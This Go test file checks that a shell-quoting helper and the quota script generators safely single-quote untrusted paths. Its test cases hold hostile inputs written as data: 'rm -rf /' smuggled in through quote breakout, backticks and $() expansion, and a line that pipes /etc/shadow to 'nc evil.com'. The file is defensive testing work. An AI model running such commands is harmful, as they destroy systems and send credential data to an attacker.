package app

import (
	"strings"
	"testing"
)

func TestShellQuote(t *testing.T) {
	tests := map[string]struct {
		input    string
		expected string
	}{
		"simple path": {
			input:    "/var/openebs/local",
			expected: "'/var/openebs/local'",
		},
		"empty string": {
			input:    "",
			expected: "''",
		},
		"string with spaces": {
			input:    "/var/my path/local",
			expected: "'/var/my path/local'",
		},
		"string with double quotes": {
			input:    `/var/"openebs"/local`,
			expected: `'/var/"openebs"/local'`,
		},
		"string with single quote": {
			input:    "/var/open'ebs/local",
			expected: "'/var/open'\"'\"'ebs/local'",
		},
		"command injection via double quotes": {
			input:    `"; rm -rf / #`,
			expected: `'"; rm -rf / #'`,
		},
		"command injection via backticks": {
			input:    "`rm -rf /`",
			expected: "'`rm -rf /`'",
		},
		"command injection via dollar expansion": {
			input:    "$(rm -rf /)",
			expected: "'$(rm -rf /)'",
		},
		"command injection via single quote breakout": {
			input:    "'; rm -rf / '",
			expected: "''\"'\"'; rm -rf / '\"'\"''",
		},
		"newline injection": {
			input:    "/var/openebs\n; rm -rf /",
			expected: "'/var/openebs\n; rm -rf /'",
		},
		"semicolon and pipe": {
			input:    "/path; cat /etc/shadow | nc evil.com 1234",
			expected: "'/path; cat /etc/shadow | nc evil.com 1234'",
		},
	}

	for name, tc := range tests {
		t.Run(name, func(t *testing.T) {
			got := shellQuote(tc.input)
			if got != tc.expected {
				t.Errorf("shellQuote(%q) = %q, want %q", tc.input, got, tc.expected)
			}
		})
	}
}

func TestGenerateQuotaApplyScript_UsesShellQuoting(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		SoftLimitGrace: "1024k",
		HardLimitGrace: "2048k",
		HostPathPrefix: "",
	}

	script := GenerateQuotaApplyScript(cfg)

	// Verify that values are single-quoted, not double-quoted
	if !strings.Contains(script, "PARENT_PATH='/var/openebs/local'") {
		t.Errorf("expected single-quoted PARENT_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "VOLUME_PATH='/var/openebs/local/pvc-abc123'") {
		t.Errorf("expected single-quoted VOLUME_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "XFS_SOFT='1024k'") {
		t.Errorf("expected single-quoted XFS_SOFT, got:\n%s", script)
	}
}

func TestGenerateQuotaCleanupScript_UsesShellQuoting(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		HostPathPrefix: "/host",
	}

	script := GenerateQuotaCleanupScript(cfg)

	// With HostPathPrefix, paths should be prefixed
	if !strings.Contains(script, "PARENT_PATH='/host/var/openebs/local'") {
		t.Errorf("expected single-quoted prefixed PARENT_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "VOLUME_PATH='/host/var/openebs/local/pvc-abc123'") {
		t.Errorf("expected single-quoted prefixed VOLUME_PATH, got:\n%s", script)
	}
}

func TestGenerateQuotaCleanupScript_InjectionAttempt(t *testing.T) {
	// Simulate a malicious BasePath that made it past other checks
	cfg := QuotaScriptConfig{
		ParentDir:      "'; rm -rf / #",
		VolumeDir:      "pvc-abc123",
		HostPathPrefix: "",
	}

	script := GenerateQuotaCleanupScript(cfg)

	// The malicious content should be safely contained in single quotes.
	// It must NOT appear as unquoted shell syntax.
	if strings.Contains(script, "PARENT_PATH=';") {
		t.Errorf("injection not neutralized — malicious content escaped quotes:\n%s", script)
	}
	// The single-quote in the payload should be escaped
	if !strings.Contains(script, `'"'"'`) {
		t.Errorf("expected single-quote escaping in output:\n%s", script)
	}
}
